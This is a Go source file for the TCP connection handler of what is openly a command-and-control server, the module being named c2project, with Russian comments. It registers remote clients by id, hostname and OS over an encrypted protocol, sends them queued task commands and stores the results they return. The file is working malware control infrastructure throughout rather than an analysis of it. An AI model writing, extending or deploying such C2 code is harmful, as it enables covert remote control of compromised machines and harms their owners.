package tcpserver

import (
	"context"
	"fmt"
	"log"
	"net"
	"strings"
	"time"

	"c2project/internal/crypto"
	"c2project/internal/packet"
	"c2project/internal/protocol"
	"c2project/internal/service"
)

// ConnReadTimeout — максимальное время ожидания пакета от клиента.
// Если клиент не присылает данные за это время, соединение закрывается.
const ConnReadTimeout = 60 * time.Second

// ClientHandler обрабатывает одно соединение от клиента.
type ClientHandler struct {
	svc *service.Service
}

// NewClientHandler создаёт обработчик соединений.
func NewClientHandler(svc *service.Service) *ClientHandler {
	return &ClientHandler{svc: svc}
}

// HandleConn обслуживает жизненный цикл одного соединения.
// На каждое чтение устанавливается дедлайн, чтобы не ждать вечно
// зависшего клиента.
func (h *ClientHandler) HandleConn(ctx context.Context, conn net.Conn) error {
	defer conn.Close()
	log.Printf("[C2] новое соединение от %s", conn.RemoteAddr())

	if err := h.setDeadline(conn); err != nil {
		return fmt.Errorf("set deadline: %w", err)
	}

	clientID, err := h.register(conn)
	if err != nil {
		return fmt.Errorf("register: %w", err)
	}
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		if err := h.setDeadline(conn); err != nil {
			return fmt.Errorf("set deadline: %w", err)
		}
		if err := h.handlePacket(conn, clientID); err != nil {
			return err
		}
	}
}

// setDeadline устанавливает дедлайн чтения на соединении.
func (h *ClientHandler) setDeadline(conn net.Conn) error {
	return conn.SetReadDeadline(time.Now().Add(ConnReadTimeout))
}

// register принимает и обрабатывает пакет регистрации.
func (h *ClientHandler) register(conn net.Conn) (string, error) {
	pkt, err := packet.Read(conn)
	if err != nil {
		return "", err
	}
	if pkt.Command != packet.CmdRegister {
		return "", fmt.Errorf("unexpected command: %x", pkt.Command)
	}
	regData, err := crypto.Decrypt(protocol.KeyC2ToClient, pkt.Payload)
	if err != nil {
		return "", fmt.Errorf("decrypt register: %w", err)
	}
	id, hostname, osName, err := parseRegistration(string(regData))
	if err != nil {
		return "", err
	}
	h.svc.RegisterClient(id, hostname, osName)
	log.Printf("[C2] клиент зарегистрирован: %s (%s, %s)", id, hostname, osName)

	ack := &packet.Packet{
		Command:   packet.CmdRegisterAck,
		SessionID: pkt.SessionID,
		MessageID: pkt.MessageID,
	}
	return id, packet.Write(conn, ack)
}

// parseRegistration разбирает строку "id|hostname|os".
func parseRegistration(s string) (id, hostname, osName string, err error) {
	parts := strings.Split(s, "|")
	if len(parts) < 1 || parts[0] == "" {
		return "", "", "", fmt.Errorf("invalid registration data")
	}
	id = parts[0]
	if len(parts) > 1 {
		hostname = parts[1]
	}
	if len(parts) > 2 {
		osName = parts[2]
	}
	return id, hostname, osName, nil
}

// handlePacket обрабатывает один пакет от зарегистрированного клиента.
func (h *ClientHandler) handlePacket(conn net.Conn, clientID string) error {
	pkt, err := packet.Read(conn)
	if err != nil {
		return err
	}
	switch pkt.Command {
	case packet.CmdGetTask:
		return h.handleGetTask(conn, clientID, pkt)
	case packet.CmdSendResult:
		return h.handleSendResult(conn, clientID, pkt)
	default:
		return fmt.Errorf("unknown command: %x", pkt.Command)
	}
}

// handleGetTask отдаёт клиенту следующую задачу (или пустой пакет).
func (h *ClientHandler) handleGetTask(conn net.Conn, clientID string, req *packet.Packet) error {
	task := h.svc.GetTaskForClient(clientID)
	resp := &packet.Packet{
		Command:   packet.CmdTaskData,
		MessageID: req.MessageID,
	}
	if task != nil {
		resp.Payload = task.Command
		resp.TreeID = 1
		log.Printf("[C2] задача %s выдана клиенту %s", task.ID, clientID)
	}
	return packet.Write(conn, resp)
}

// handleSendResult сохраняет результат и отправляет подтверждение.
func (h *ClientHandler) handleSendResult(conn net.Conn, clientID string, req *packet.Packet) error {
	if err := h.svc.StoreResult(clientID, req.Payload); err != nil {
		log.Printf("[C2] ошибка сохранения результата: %v", err)
	}
	ack := &packet.Packet{
		Command:   packet.CmdResultAck,
		MessageID: req.MessageID,
	}
	return packet.Write(conn, ack)
}